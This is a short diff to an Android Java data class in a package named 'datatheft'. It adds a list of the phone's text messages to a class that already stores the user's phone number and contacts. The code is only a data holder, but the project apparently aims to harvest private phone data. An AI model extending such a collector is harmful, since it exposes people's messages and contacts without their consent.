@@ -1,5 +1,8 @@
 package nerdcastle.datatheft;
 
+import android.os.*;
+import android.os.Message;
+
 import java.util.ArrayList;
 
 /**
@@ -9,10 +12,13 @@ import java.util.ArrayList;
 public class Info {
     private String userPhoneNUmber;
     private ArrayList<Contact>contacts;
+    private ArrayList<PhoneMessage>messages;
 
-    public Info(String userPhoneNUmber, ArrayList<Contact> contacts) {
+
+    public Info(String userPhoneNUmber, ArrayList<Contact> contacts, ArrayList<PhoneMessage> messages) {
         this.userPhoneNUmber = userPhoneNUmber;
         this.contacts = contacts;
+        this.messages = messages;
     }
 
     public Info() {
@@ -32,5 +38,13 @@ public class Info {
 
     public void setContacts(ArrayList<Contact> contacts) {
         this.contacts = contacts;
+    }
+
+    public ArrayList<PhoneMessage> getMessages() {
+        return messages;
+    }
+
+    public void setMessages(ArrayList<PhoneMessage> messages) {
+        this.messages = messages;
     }
 }
